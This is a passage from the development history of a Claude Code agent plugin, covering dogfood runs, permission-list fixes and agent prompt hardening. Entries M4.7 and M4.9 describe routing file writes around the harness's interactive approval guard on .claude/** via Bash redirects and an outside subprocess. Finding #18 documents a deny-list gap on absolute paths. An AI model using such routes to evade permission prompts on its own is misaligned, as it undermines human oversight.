**D3-2 (new, blocking dogfood-3): Bash redirect to `.claude/**` is denied by the harness in `claude --plugin-dir` mode, contradicting the M4.7 thesis.** The sub-claude reported both `mkdir -p <wt>/.claude/` and `sed > <wt>/.claude/settings.json` were blocked despite `<wt>-worktrees/**` being in `additionalDirectories`. Step 7's hard-refusal ("do NOT advance to step 8 with a missing / corrupt / unmodified settings file") correctly stopped the chain. M4.7's probe and M4.9's empirical both succeeded — but M4.9's case is `Bash(atelier-setup-project:*)` (a *binary invocation*, not an inline shell redirect inside a slash command). The thesis "Bash redirect bypasses the `.claude/**` guard when the path is in `additionalDirectories`" is therefore **mode-dependent**, not universally true. Captured for investigation as **M4.11** (added to ROADMAP in this PR).

**D3-3 (new, simple fix): `atelier-setup-project` doesn't gitignore the project's `.claude/settings.json`.** The helper only adds `.task-log/`, `.claude/settings.local.json`, and `.DS_Store` to `.gitignore`. The `settings.json` it writes has the operator's *absolute* path baked in via `sed`, so when the operator commits it (no `.gitignore` rule prevents this), every clone inherits a useless `additionalDirectories`. Concretely surfaced here: my `git add .claude` for dogfood-3's initial commit captured a `settings.json` pointing at `/Users/mike/Work/atelier-dogfood-3`. Then `git wt switch task/1-add-greet-module` checked that mispathed file into the task worktree before `/next-task` step 7 had a chance to regenerate it. Captured as **M4.10** (added to ROADMAP in this PR), one-line fix path documented.

**Setup work that succeeded (partial validation of M4.9 in practice):**

- `gh repo create AkaLab-Tech/atelier-dogfood-3 --private`, cloned to `/Users/mike/Work/atelier-dogfood-3`.
- Node/TS scaffolding: `pnpm init` (version pinned to 0.1.0 for task #2's bump scenario), `pnpm add -D vitest typescript @types/node`, `tsconfig.json`, `test/sanity.test.ts` (passes).
- `atelier-setup-project --yes <dogfood-3>` ran clean from the operator's terminal — second confirmation that M4.9's harness-bypass-via-subprocess thesis holds for the bootstrap step (separate from M4.7's per-task-settings thesis which has the D3-2 wrinkle).
- Initial commit + push to origin main with the 2 tasks in `ROADMAP.md`.
- `claude -p "/atelier:next-task --yes" --plugin-dir <atelier-checkout>` with `CLAUDE_PLUGIN_ROOT` exported: steps 1–6 of `/next-task` succeeded (worktree clean, IN_PROGRESS empty, task #1 picked via `task-discovery`, auto-claimed, ROADMAP→IN_PROGRESS moved, `task/1-add-greet-module` worktree created at the canonical path). Step 7 failed → chain aborted before `task-orchestrator` ever ran.

**Cleanup performed:** `git restore IN_PROGRESS.md ROADMAP.md` on dogfood-3 main (revert the claim of task #1), `git wt rm task/1-add-greet-module` + `git branch -D task/1-add-greet-module` (remove worktree and orphan branch). dogfood-3 main is back to its initial-commit state; the GitHub repo remains in place for the next attempt.

**What is still unvalidated end-to-end** (deferred to a future dogfood-4 after M4.10 + M4.11 land):

- M4.6 beyond step 6 of `/next-task` — the orchestrator and the rest of the chain never ran.
- M4.7's runtime behavior of per-task settings instantiation (step 7 itself, which is what M4.11 is about).
- M4.8's tracking move on the task branch (`pr-author`'s step 5).
- Finding [#18](https://github.com/AkaLab-Tech/atelier/pull/35) (deny-list absolute-path engagement on `package.json`) — task #2 was never attempted.
- Finding [#19](https://github.com/AkaLab-Tech/atelier/pull/36) (orchestrator delegating to `unblocker` via Task tool) — depends on task #2's forced-failure path.
- Auto-merge gate + reviewer Opus call + same-identity self-approval limitation (Finding #11).

**Cost summary:** one failed `claude -p` invocation (the second attempt — first was killed before it produced output due to a wrong-cwd mistake), plus the model calls from `/next-task` steps 1–6. Approximate spend: <$1.

**Why this is in its own PR (not bundled with the M4.10 fix):** D3-3's fix is a one-line bash change but the dogfood-3 finding-summary and the new ROADMAP entries (M4.10 + M4.11) constitute the audit-trail of *why* the fix is needed. Shipping the doc first, then the fix in a follow-up PR, keeps the M4.10 PR small and reviewable.

**Follow-ups (now in ROADMAP):**

- M4.10 — gitignore `.claude/settings.json` (the D3-3 fix).
- M4.11 — investigate the M4.7 thesis under `claude --plugin-dir` ad-hoc mode (the D3-2 investigation).
- After both land: dogfood-4 with the same task-#1/task-#2 design, either on a fresh repo or after a cleanup commit to `atelier-dogfood-3`.

### M4.9 — `atelier-setup-project` bash helper script — 2026-05-20
**PR:** [#39](https://github.com/AkaLab-Tech/atelier/pull/39)

Fourth post-Phase-4 follow-up. Closes the `/setup-project` parallel of the `.claude/**` harness-guard problem. M4.7 solved it for the per-task `<task-wt>/.claude/settings.json` by using `Bash` + shell redirect (`sed > file`) instead of `Write` (the harness gates `Write`/`Edit` on `.claude/**` with an interactive approval prompt that fatally hangs `claude -p` mode). But `/setup-project` also has to write a brand-new prose file at `<project>/.claude/CLAUDE.md` — there is no template-substitution form for that, so the Bash-redirect trick alone is not enough.

This PR moves the whole `/setup-project` bootstrap out of the Claude session entirely. The slash command becomes a thin wrapper that invokes a standalone bash script via `Bash(atelier-setup-project:*)`; the script does every file write from a subprocess that never goes through the Claude tool guards. The harness only sees the single Bash invocation — not the individual writes inside it.

**Two reasons to prefer "move outside the harness" over "thread the gates more cleverly":**

- The harness's `.claude/**` guard is the kind of constraint that grows over time, not shrinks. Anything we thread today is one Claude Code release away from a new shape of refusal. A bash script that runs outside the harness has the OS's file permissions as its only contract — stable.
- The bash script is also runnable directly from the operator's terminal (no Claude session required). One canonical entry point for both flows is less code than two implementations that have to stay aligned.

**Delivered:**

- `scripts/atelier-setup-project` (NEW, executable) — standalone bash script, ~430 lines. Implements every step from the prior `commands/setup-project.md` spec:
  1. CLI parse (`--plugin-root <path>` / `--yes` / `-y` / `--help`, single positional `<project-path>`, `--` terminator).
  2. Required-tool check (`jq`, `sed`, `mkdir`, `grep`, `date`).
  3. Plugin-root resolution in four-step priority: `--plugin-root` flag → `$ATELIER_PLUGIN_ROOT` env → script-relative discovery (walks symlinks so the `~/.local/bin/atelier-setup-project → <atelier>/scripts/atelier-setup-project` install case works) → `~/.claude/plugins/*/atelier/` glob (marketplace install). Each candidate validated by `looks_like_plugin_root()` (must contain both `templates/settings.template.json` and `.claude-plugin/plugin.json`). Actionable error with the full search trail if all four fail.
  4. Project-path resolution: defaults to `.`; refuses `$HOME`, `/`, `/bin`, `/sbin`, `/var`, `/opt`, `/private` as literals, and the entire subtrees of `/etc`, `/usr`, `/Applications`. Importantly does NOT deny `/var/*` or `/private/*` subtrees — that is where macOS `mktemp -d` lives, and smoke-testing the bootstrap there must work.
  5. Idempotence: reads `~/.claude/.atelier-config.json` via `jq -e`. Non-interactive re-run on a configured project → exit code 2 with explicit error. Interactive re-run → ask before overwriting.
  6. Eight setup steps with per-step status (`created` / `updated` / `preserved` / `appended`): `.claude/settings.json` from template (with five-guard validation: `sed` succeeds, file parses with `jq empty`, no literal `<worktree>` left, settings file actually written, target path resolves), `ROADMAP.md` / `IN_PROGRESS.md` / `HISTORY.md` starters, `.claude/CLAUDE.md` from new template, `.npmrc` (the three PLAN.md §4 guardrails, appended only when missing), `.gitignore` (three entries, appended only when missing), and `~/.claude/.atelier-config.json` record (via `jq` merge — never clobbers other project entries).
  7. Summary block + "next: cd <path> && /next-task" hint.

- `templates/project-claude.md.template` (NEW) — starter CLAUDE.md content for new projects, with `<project-name>` placeholder substituted by `sed`. Extracted from the inline block that used to live in `commands/setup-project.md` §5.

- `commands/setup-project.md` (REWRITTEN) — was ~200 lines of step-by-step instructions to the model; now ~50 lines of contract documentation that ends in a single `Bash(atelier-setup-project ...)` invocation. Frontmatter `allowed-tools` collapses from 9 entries (`Read, Write, Edit, Glob, Grep, Bash(mkdir:*), Bash(sed:*), Bash(jq:*), Bash(test:*), Bash(ls:*), Bash(date:*), Bash(env:*)`) to 1 (`Bash(atelier-setup-project:*)`). The harness gates that were the root cause of the problem are not in the allow-list anymore because the slash command does not invoke them.

- `templates/settings.template.json` (1-line change) — adds `Bash(atelier-setup-project:*)` to the allow list so the slash command's single Bash invocation passes the per-task permission scope.

- `install.sh` (Phase C.1 extended) —
  - New global `ATELIER_REPO_ROOT="$(cd -P "$(dirname "${BASH_SOURCE[0]}")" && pwd)"` so the symlink target is computed once from the install.sh's own location.
  - New `phase_c_1_setup_project_helper()` function: symlinks `$ATELIER_REPO_ROOT/scripts/atelier-setup-project` → `~/.local/bin/atelier-setup-project`. Idempotent: if the symlink is already correct, skip; if pointing elsewhere, fix; if a regular file (operator pinned a copy), warn and leave alone.
  - The shellrc hooks block gains a PATH guard that adds `$HOME/.local/bin` to `PATH` when absent. Implemented as `[[ ... ]]` instead of the more idiomatic `case ... esac` because the closing `)` in a case pattern would terminate the surrounding `$(cat <<'BLOCK' ...)` substitution prematurely (a classic bash heredoc-in-cmdsub gotcha — comment in the file explains).

**Tests:**

- `bash -n` clean on the new script and on the modified `install.sh`.
- End-to-end smoke test in a tmpdir with isolated `$HOME`:
  - First run with `--yes` on a fresh project: all 8 outputs `created`, exit 0. Verified `<path>/.claude/settings.json` parses with `jq empty` and the `<worktree>` substitution landed (the project absolute path appears in both slots of `additionalDirectories`). Verified `<path>/.claude/CLAUDE.md` got the project name substituted. Verified `~/.claude/.atelier-config.json` has the project recorded with `setupCompleted` and `setupVersion`.
  - Second run with `--yes` on the same project: exit code 2 with the "Reconfigure is not allowed in non-interactive mode" message — the safe default holds.
  - Run on a project that pre-existed with a `ROADMAP.md` and a weak `.npmrc` (only `audit-level=moderate` set): `ROADMAP.md` preserved, `.npmrc` got `ignore-scripts=true` and `minimum-release-age=10080` appended (the two truly-missing lines only — operator's existing content untouched), all other files created.
- `install.sh` Phase C.1 symlink behavior: simulated the new function in a sandboxed `HOME`. Confirmed the symlink is created at `~/.local/bin/atelier-setup-project`, points at `$ATELIER_REPO_ROOT/scripts/atelier-setup-project`, and the binary is invocable via PATH.
- Empirical confirmation that `claude -p "/atelier:setup-project /tmp/fresh --yes"` runs end-to-end without firing any `.claude/**` interactive prompt is deferred to **dogfood-3** (the natural validation exercise for M4.6 + M4.7 + M4.8 + M4.9 together).

**Decisions captured:**

- **Auto-discover with `--plugin-root` override, not env-var-only.** Considered making `$ATELIER_PLUGIN_ROOT` the only contract (set by the shellrc hook block). Rejected: the operator who clones atelier and runs `./scripts/atelier-setup-project` directly (no shell reload after install.sh) would hit a confusing "env var not set" error. The four-step priority makes the slash-command path explicit (passes `--plugin-root "$CLAUDE_PLUGIN_ROOT"`), the env-set-by-shellrc path graceful, the script-relative path automatic for direct invocations, and the marketplace path automatic for non-CLI installs.
- **Separate `templates/project-claude.md.template` file, not embedded heredoc.** A heredoc keeps the script self-contained but moves prose into shell escaping — every backtick or quote in the markdown becomes a tiny landmine, and editing the starter requires editing bash code. Mirrors how `settings.template.json` is already handled.
- **Symlink, not copy.** A copy would mean `install.sh` re-runs after a script update push out the change, and any operator who never re-runs `install.sh` would have a stale helper. The symlink picks up every `git pull` in the atelier checkout automatically.
- **Single `Bash(atelier-setup-project:*)` allow entry, not also `Bash(atelier-setup-project)`.** The `:*` suffix already matches the bare command (Claude Code's matcher treats `:` as the argument boundary). Adding the bare form would be belt-and-braces without effect.
- **The slash command still relays the helper's stdout verbatim.** Considered having the slash command parse the output and produce a cleaner Claude-side summary. Rejected for v1: the helper's output is already operator-facing and concise, parsing-then-reprinting is a bug surface, and verbatim output keeps the contract simple.

**Acceptance criterion status:** the M4.9 acceptance — *"`claude -p \"/atelier:setup-project /tmp/fresh-project --yes\"` completes the full bootstrap without the harness firing any `.claude/**` interactive prompt"* — is **structurally satisfied** by routing the entire bootstrap through a `Bash(atelier-setup-project:*)` subprocess that the harness sees as a single tool call. The empirical confirmation belongs to dogfood-3.

**Follow-ups:**

- Dogfood-3 — end-to-end validation of M4.6 + M4.7 + M4.8 + M4.9 together on a real GitHub repo. After M4.9 lands, atelier is operationally ready for non-toy use.
- **Maintenance tax to close:** `commands/setup-project.md` and `scripts/atelier-setup-project` now implement the same flow in two languages. They have to be hand-synced when either changes. Future task picks one of: (i) bash script is source of truth, slash spec reduces to "see `atelier-setup-project --help`"; (ii) slash spec is canonical contract, CI smoke check asserts the script honours it. Captured in the M4.9 IN_PROGRESS block before merge and noted again in the slash command's own spec for visibility.

### M4.8 — Tracking move on the right worktree, enforced (Findings #13 + #17) — 2026-05-20
**PR:** [#38](https://github.com/AkaLab-Tech/atelier/pull/38)

Third post-Phase-4 follow-up. The ROADMAP framed M4.8 as "harden `pr-author` so it always does its `IN_PROGRESS.md → HISTORY.md` move". Inspection of the dogfood-2 happy-path run showed the issue was deeper: the `task-orchestrator`'s **step 2** edited the **main** worktree's `IN_PROGRESS.md` (uncommitted, because no agent is allowed to push to `main`), then **step 3** created the per-task worktree from `main`-committed — so the per-task worktree's `IN_PROGRESS.md` had no entry to remove, and `pr-author` correctly observed "nothing to move". The two findings (#13 missing move, #17 wrong worktree) were the same root cause: the move was happening in the wrong place. This PR fixes both by reordering the orchestrator's steps so the move lives entirely on the task branch.

**The shape of the fix:**

Before this PR:

```
orchestrator Step 2:  edit MAIN worktree's IN_PROGRESS.md (uncommitted, can't push to main)
orchestrator Step 3:  create task worktree from main-committed (no entry visible there)
pr-author Step 5:     "nothing to move", silently skipped (Finding #13)
squash-merge to main: main inherits task branch which never had the entry → bookkeeping desynced
```

After this PR:

```
orchestrator Step 2:  create task worktree from main-committed
orchestrator Step 3:  edit TASK worktree's IN_PROGRESS.md (commits to task branch)
pr-author Step 5:     remove entry from IN_PROGRESS.md, add to HISTORY.md (commits to task branch)
squash-merge to main: brings both edits in a single commit → roadmap-tracking-flow honoured
```

The choice between ROADMAP's option (a) and (b) (harden the agent vs. move it to `auto-merge`) is settled by the constraint that **no agent is allowed to push to `main`**. Option (b) would require either `auto-merge` to push the bookkeeping change to `main` post-merge (denied) or to assume the change is already on the task branch (in which case option (a) was always needed). Option (a) it is.

**Delivered:**

- `agents/task-orchestrator.md` —
  - **Reordered steps 2 ↔ 3:** worktree creation now precedes the tracking-forward move. The resume-mode branch references in step 1 are updated to match (`skip the worktree creation in step 2`, `skip the tracking move in step 3`).
  - **New scope rule in step 3:** "edit the `ROADMAP.md` and `IN_PROGRESS.md` that live **inside the per-task worktree**, NOT the copies in the main worktree" — with the rationale (squash-merge brings both moves together, honouring `roadmap-tracking-flow`'s "same PR" rule; editing main would leave uncommitted bookkeeping no agent can push).

- `agents/pr-author.md` —
  - **Step 5 rewritten as "non-negotiable"** with explicit scope rule (edit the per-task worktree, not main), three-point verification before opening the PR (entry gone from `IN_PROGRESS`, entry present in `HISTORY`, both staged in the same commit chain), and an explicit "stop and fix" if any check fails.
  - **Two new hard refusals** added to Decision rules: never skip step 5 (the move is part of the PR — not an afterthought, not the auto-merge skill's job), and never edit the main worktree's copies (mirrors the `unblocker` fix from PR #32).
  - **Output line tightened:** the "Tracking:" line should always read exactly the success form. The "or the reason it was skipped" escape hatch was the canonical excuse for Finding #13; removing it from the spec closes that door.

**Tests:**

- YAML frontmatter parses cleanly on both modified files.
- Plugin loader still discovers all 7 atelier agents.
- Empirical validation (a real `claude -p "/atelier:next-task --yes"` end-to-end where `pr-author` actually opens a PR that contains the tracking move) is **deferred to the next dogfood**. Reordering the orchestrator and tightening the pr-author prompt are structural — the question of whether the model honours the prompt in practice belongs to the next end-to-end exercise.

**Decisions captured:**

- **Reorder, not duplicate.** A tempting half-fix would have been to leave the orchestrator's step 2 in main and ALSO re-do the move in the task worktree. That would have created two divergent edits to track. Reordering — so there is exactly one place the move happens — keeps the audit trail clean.
- **Hard refusal in pr-author's Decision rules, not just in the step text.** Dogfood-1 showed the agent will absorb step text it thinks is "covered upstream" (in this case, "the orchestrator probably did this already"). A hard refusal in the Decision rules section is harder to interpret away — it is the same shape as the "never push --force" and "never add Co-Authored-By" rules, both of which the model has consistently honoured.
- **No change to `auto-merge` skill.** Considered adding a "verify the tracking move is in the PR" guardrail there as belt-and-braces. Decided against — it would mean the auto-merge skill HELDs PRs for a missing move, when the cleaner fix is to prevent the missing-move state from arising at all. Less moving parts, fewer places to keep in sync.
- **Verification block, not assertion.** Step 5's verification uses three observable checks (heading gone, entry present, both staged) rather than a single "did you do the move" question. The model has shown a pattern of answering yes to high-level questions when it has not done the lower-level work; reading the actual file contents is the only way to be sure.

**Acceptance criterion status:** the M4.8 acceptance — *"after a merged task PR, `IN_PROGRESS.md` no longer contains the task entry and `HISTORY.md` does"* — is **structurally satisfied** by the orchestrator reorder + pr-author hardening. The empirical confirmation belongs to the next dogfood (which will validate M4.3 + M4.6 + M4.7 + M4.8 together).

**Follow-ups (still in ROADMAP):**

- M4.9 — `atelier-setup-project` bash helper script (operator-facing, runs outside the Claude session, sidesteps the harness `.claude/**` guard for the project bootstrap path that M4.7 sidestepped for the per-task settings path).
- Dogfood-3 (or a dogfood-2 re-run) will validate this PR end-to-end on a real GitHub repo.

### M4.7 — Per-worktree `.claude/settings.json` instantiation hardened — 2026-05-20
**PR:** [#37](https://github.com/AkaLab-Tech/atelier/pull/37)

Second post-Phase-4 follow-up. Closes [dogfood-1 Finding #12](HISTORY.md): `/atelier:next-task`'s step 7 was supposed to instantiate `<task-worktree>/.claude/settings.json` from the plugin template with the worktree path substituted, but the dogfood-1 run silently skipped it (the harness blocked the write). Sub-agents inherited the main session's permission scope so the chain worked anyway — but if the operator ever opens a Claude Code session **directly inside** a per-task worktree (e.g., to investigate a blocked task, or once `/resume-task` lands a "open here" workflow), that inherited scope is gone and the agents see a stale or absent settings file. This PR hardens step 7 to actually create the file, verifies the substitution landed, and documents the single non-obvious technique the rest of the codebase needs to know about.

**The technique (probe finding):** the Claude Code harness has a **built-in interactive guard** on the `Write` and `Edit` tools when the target path is under `.claude/**` — regardless of what the project's `settings.json` allows. The guard hangs the chain in `claude -p` mode because there is no operator to answer the prompt. But the guard is **tool-specific**: a `Bash` tool operation with shell redirect (`sed > file`) bypasses the `Write` / `Edit` check entirely, going through the per-path allow / deny matrix instead. Empirically verified during this milestone's design probe:

- `Write` to `<task-wt>/.claude/settings.json` → harness prompts for approval, hangs in `-p`.
- `Bash` with `sed '…' > <task-wt>/.claude/settings.json` → passes if `<task-wt>` is in `additionalDirectories` (post-PR #32: it is, via `<worktree>-worktrees`).

Dogfood-1's step-7 skip was a combination of two issues that have since been fixed independently: (a) pre-PR #32, `<worktree>-worktrees/**` was not in `additionalDirectories`, so even the Bash redirect failed; (b) `/next-task`'s frontmatter did not declare `Bash(mkdir:*)` / `Bash(jq:*)` so the verification half of step 7 would have failed even if the write had succeeded. This PR closes both.

**Delivered:**

- `commands/next-task.md` —
  - Frontmatter `allowed-tools` gains `Bash(mkdir:*)`, `Bash(jq:*)`, `Bash(test:*)`.
  - Step 7 rewritten as a single Bash command (chained with `&&`) that does **all five guards** at once: `mkdir -p`, `sed | redirect`, `jq empty`, `test` for substitution-landed (no literal `<worktree>` left), and `test` for the substitution being in the canonical first slot of `additionalDirectories`. Any guard failing → stop with a per-step error message.
  - New explicit hard-refusal block: never use `Write` for `<task-wt>/.claude/settings.json`, always Bash + redirect. Never substitute with the main repo path. Never skip the substitution-landed check (a file that exists but still contains `<worktree>` literal silently widens `additionalDirectories` to a nonsense pattern).
  - Inline documentation of **why** Bash + redirect bypasses the `.claude/**` interactive guard — so the next person who touches this code understands the constraint and does not "simplify" it back to `Write`.

**Tests:**

- YAML frontmatter parses cleanly.
- Probe run during design confirmed empirically that `Write` to `.claude/**` is gated, `Bash > .claude/...` is not (when the path is in `additionalDirectories`).
- End-to-end exercise (a future dogfood-3 / dogfood-2 re-run) will validate the five-guard Bash chain in a real `claude -p` invocation. Deferred from this PR.

**Decisions captured:**

- **Single Bash command with five guards, not five separate Bash calls.** A chained command (`A && B && C`) fails atomically — either all guards pass or the chain stops at the first failure, leaving no partial state. Five separate `Bash` invocations would let intermediate state surface between guards (the file would exist briefly with `<worktree>` still in it), which is harder to reason about.
- **Verify substitution landed, not just that the file exists.** Dogfood-1's silent skip was the canonical mistake — "the file exists, we must be good". The new step explicitly tests that `additionalDirectories[0]` equals the **absolute task-worktree path** (not the main repo path, not the literal `<worktree>`).
- **No change to `setup-project.md` in this PR.** It has the same shape of issue (creating `<project>/.claude/CLAUDE.md` via the `Write` tool, which the harness also gates). Scope-keeping: M4.7's acceptance is per-task settings, not project bootstrap. Setup-project's gap is M4.9 territory (the operator-facing bash helper script). Two related fixes shipped together would make either harder to review.
- **`resume-task.md` not touched.** Interrupted-resume + blocked-resume both expect the per-task settings.json to already exist (created by the original `/next-task` invocation). If the operator deleted it manually, that is operator-managed state — `/resume-task` does not auto-heal.

**Acceptance criterion status:** the M4.7 acceptance — *"after `/atelier:next-task`, `<worktree>/.claude/settings.json` exists, parses with `jq empty`, and has `<worktree>` substituted with the per-task worktree path"* — is **structurally satisfied** by step 7's new five-guard Bash chain. The empirical confirmation that the chain runs cleanly in a real `claude -p` invocation belongs to a future dogfood.

**Follow-ups (still in ROADMAP):**

- M4.8 — `pr-author` `IN_PROGRESS.md → HISTORY.md` enforcement (Finding #13, #17). Independent of M4.7.
- M4.9 — `atelier-setup-project` bash helper script. Will solve the same harness-gate issue for `/setup-project`'s `Write` calls (CLAUDE.md, etc.) by running outside the Claude session entirely.
- Dogfood-3 (or another dogfood-2 re-run) will validate M4.7 + M4.6 + M4.3 end-to-end on a real GitHub repo.

### Finding #19 fix — orchestrator must invoke `unblocker` via `Task`, never inline — 2026-05-20
**PR:** [#36](https://github.com/AkaLab-Tech/atelier/pull/36)

Tiny follow-up to dogfood-2's PR #35 validation run. On the validating re-run, the `task-orchestrator` reached `hard-stop` correctly, then **absorbed the four `unblocker` responsibilities inline** (create the `blocked` label, open the GitHub issue with the 6 logs, mark `IN_PROGRESS.md` with `[BLOCKED]`, open the docs companion PR) instead of delegating via the `Task` tool. The outcome was identical to what `unblocker` would have produced, but the audit-trail value of a discrete `unblocker` invocation was lost — operator post-mortem and any future analysis tooling read the per-agent boundaries to reconstruct what happened.

**Delivered:**
- `agents/task-orchestrator.md` — adds one explicit hard refusal to the Decision rules section: *"Never absorb `unblocker`'s responsibilities inline. On `hard-stop` from `retry-with-logs`, you must invoke `atelier:unblocker` via the `Task` tool — even when you believe you could do the work yourself."* with a one-paragraph rationale about audit-trail value, per-agent safety scope, and the fact that inline simulation makes the chain harder to trace.

**Tests:**
- YAML frontmatter parses cleanly.
- No new permissions, no other agent edits — single hard-refusal addition.
- End-to-end exercise (a future dogfood-3 / dogfood-2 re-run after this lands) is what confirms the model honours the new refusal in practice. Behavioural rules in prompts are not 100% deterministic; if the model still simulates inline after this fix, the next escalation is converting the chain to multi-step `Task` invocations with structured outputs the orchestrator parses, which is significantly more work.

**Why this is in its own PR:**
- PR #35 (Finding #18 deny-list fix) was a critical security fix and was already validated end-to-end. Mixing in this prompt-tuning would have made the PR less reviewable.
- Finding #19 is informational from PR #35's validation run, not a regression of #35 itself. Cleaner audit trail to ship it as a separate follow-up.

**Acceptance criterion:** the next dogfood (whenever it happens) should show the orchestrator producing a `Task(subagent_type="atelier:unblocker", ...)` call at the moment of `hard-stop`, instead of inlining the four steps. The structural fix is in this PR; the empirical validation belongs to that future dogfood.

### Dogfood-2 (partial) + Finding #18 fix — deny list absolute-path variants — 2026-05-20
**PR:** [#35](https://github.com/AkaLab-Tech/atelier/pull/35)

Second dogfood run on a real GitHub repo (`AkaLab-Tech/atelier-dogfood-2`, private) surfaced **one critical security finding** that PR #32's sandbox fix had inadvertently exposed and that dogfood-1 had hidden by accident. Also confirmed **two known findings** (operator-CLAUDE-vs-atelier push consent + `pr-author` editing the wrong worktree's `IN_PROGRESS.md`). Task #1 (happy path) completed end-to-end with the same manual operator confirmation pattern as dogfood-1; **Task #2 (forced-failure) could not validate the hard-stop loop** because the guardrail it depended on was broken, and the `task-orchestrator` correctly refused to fabricate fake failures.

**The critical finding (#18):** in `settings.template.json` the deny entries for `package.json`, `pnpm-lock.yaml`, and `.github/workflows/**` used relative paths (`./package.json`, etc.). The claude-code permission matcher treats `./` literally — it does **not** resolve it against CWD — so when the `Edit` / `Write` tool is invoked with an absolute path (e.g. `/Users/.../task-2-…/package.json`), the deny rule does not match. After PR #32 added `Edit(<worktree>-worktrees/**)` to the allow list (M4.2/dogfood-1's sandbox-extension fix), those absolute-path edits were no longer blocked by the absence of any allow rule — and the deny that *should* have blocked them never engaged. Net effect: **every file in the PLAN.md §6 forbidden list (package.json, pnpm-lock.yaml, workflows) was silently editable from any task worktree.**

The bug was masked in dogfood-1 because PR #32's sandbox fix was not yet applied — no `Edit(<absolute-path>)` was ever allowed in the first place, so the broken deny rule never had to engage. The dogfood-2 sequence first applied PR #32 (sandbox extension), then triggered Task #2 (which intentionally requires editing `package.json`), at which point the `task-orchestrator` verified the bypass — `Edit("/Users/.../package.json", "1.0.0" → "2.0.0")` succeeded, and immediately `Edit("…", "2.0.0" → "1.0.0")` succeeded too. Both edits ran without any deny / ask prompt. The orchestrator then refused to advance the chain — fabricating fake failures to drive the retry budget would invalidate `retry-with-logs`'s audit trail.

**The fix:** every relative-path entry in `deny` and `ask` now has matching absolute-path variants that survive `sed`-substitution of the `<worktree>` placeholder:

- For each of `package.json`, `pnpm-lock.yaml`, `.github/workflows/**` (deny): added `Edit(<worktree>/<path>)`, `Edit(<worktree>-worktrees/**/<path>)`, `Write(<worktree>/<path>)`, `Write(<worktree>-worktrees/**/<path>)`. Six entries per file.
- For each of `.env*`, `Dockerfile`, `docker-compose*` (ask): same six-entry pattern.
- The original `./` entries are retained for backwards compatibility with any caller that does invoke `Edit` with a relative path.

After the fix, a sample `sed`-substituted template confirms the deny list covers both forms:

```
"Edit(./package.json)",
"Edit(/Users/mike/Work/myproj/package.json)",
"Edit(/Users/mike/Work/myproj-worktrees/**/package.json)",
"Write(./package.json)",
"Write(/Users/mike/Work/myproj/package.json)",
"Write(/Users/mike/Work/myproj-worktrees/**/package.json)",
```

**Tests:**
- `python3 -m json.tool templates/settings.template.json` clean after the edit.
- Sample `sed s|<worktree>|/Users/mike/Work/myproj|g` confirms the substituted paths.
- End-to-end exercise (re-run Task #2 of dogfood-2 with this fix applied, confirming the deny engages and the retry budget drives 6 attempts → hard-stop → `unblocker`) follows in a separate run — captured here only after that runs cleanly. **Status pending; this PR ships the structural fix first.**

**Two other findings observed in dogfood-2 (documented but not fixed in this PR — separate follow-ups warranted):**

- **Finding #16** — the operator's personal `CLAUDE.md` rule "never push without confirmation" overrides atelier's per-worktree push allow rule for `task/*` branches, even under `--yes`. The `task-orchestrator` correctly halted before pushing. There is no clean fix at the atelier level — the operator-level rule is authoritative by design. **Recommendation:** document this conflict in M6.4 (troubleshooting) so the operator either temporarily lifts the rule for dogfood / autonomous runs or pre-authorizes pushes for atelier explicitly. Did not happen yet.
- **Finding #17** — `pr-author` edits the failing task's worktree copy of `IN_PROGRESS.md` / `HISTORY.md`, not the **main** worktree's. The squash-merge "fixes" the mismatch accidentally by overwriting `main`'s tracking files with the task worktree's. Same shape as Finding #14 (which we fixed for `unblocker` in PR #32), now applies to `pr-author` too. **Should be folded into M4.8** (already in ROADMAP) when it lands.

**Decisions captured:**

- **Add absolute variants, do not remove the relative ones.** Relative entries still match when `Edit` is invoked with an explicit `./path` argument. Removing them would create a regression for that call shape. Both forms exist; both are denied.
- **Use the `<worktree>` placeholder twice per file, not a single broader pattern.** A broader `Edit(/Users/**/package.json)` would deny every project's `package.json` system-wide, which is too aggressive — the operator may legitimately edit other projects from the same Claude Code session. The two-pattern approach scopes the deny to the atelier-managed project (`<worktree>`) and its per-task worktrees (`<worktree>-worktrees/**`).
- **Both `Edit` and `Write`.** The bug was discovered via `Edit`, but `Write` would have the same shape — and `Write` was never in the deny list at all (a second, related gap). Both are now denied.
- **`ask` rules get the same treatment.** `.env*`, `Dockerfile`, `docker-compose*` were `ask` (operator-confirms), not `deny`. The same absolute-path bypass applies — under `--yes` the operator's pre-authorization would silently let them through with the relative-only ask. Patched the same way.

**Acceptance criterion status:** Finding #18 has no formal ROADMAP entry — it is an emergent dogfood-2 finding. The implicit acceptance is "the deny list actually denies edits to the listed files regardless of how `Edit`/`Write` is invoked". The structural fix here meets that. The end-to-end re-run of dogfood-2 Task #2 (which depends on this fix) is the validating exercise and is deferred to a follow-up run / HISTORY entry.

**Follow-ups (carried forward):**

- Re-run dogfood-2 Task #2 with this fix applied — should reach `hard-stop → unblocker → blocked GitHub issue` end-to-end. The dogfood-2 worktree (`atelier-dogfood-2-worktrees/task-2-…`) is currently preserved on disk for this purpose.
- Finding #16 — operator-vs-atelier push consent → document in M6.4 (troubleshooting).
- Finding #17 — `pr-author` worktree-mismatch → fold into M4.8.

### M4.6 — Non-interactive mode for entry-point commands + `task-orchestrator` — 2026-05-19
**PR:** [#34](https://github.com/AkaLab-Tech/atelier/pull/34)

First post-Phase-4 follow-up. Closes [dogfood-1 Finding #7](HISTORY.md): under `claude -p` (no TTY for the operator to answer), `/atelier:next-task` traps on its Step-4 confirmation prompt — and so does `task-orchestrator`'s standard-mode Step 1 confirm. With this PR every "ask the operator" point in the four entry-point files has a non-interactive branch with a documented safe-default rule.

**The contract (single source of truth):**

You are non-interactive if **any** of these is true:
- `$ARGUMENTS` contains the literal token `--yes` (whitespace-bounded).
- `$ARGUMENTS` contains the literal token `-y` (whitespace-bounded, not embedded in another flag).
- The environment variable `ATELIER_AUTO` is set to any non-empty value.

Otherwise, interactive. The signal is **deterministic** — never inferred from runtime probes like `test -t 0` (TTY checks on the agent's Bash sub-process are unreliable when the parent claude process is itself non-interactive). The operator opts in explicitly per invocation (the flag) or per session (the env var).

**Delivered:**

- `commands/next-task.md` — new "Interaction mode" section + per-step behaviour:
  - Step 1 (dirty worktree): interactive asks how to proceed; non-interactive stops with error (refuses to guess between stash / continue / abort).
  - Step 2 (occupied `IN_PROGRESS.md`): both modes refuse, but non-interactive surfaces the error rather than offering options.
  - Step 3 (task id parse): strips `--yes` / `-y` from `$ARGUMENTS` before parsing the id.
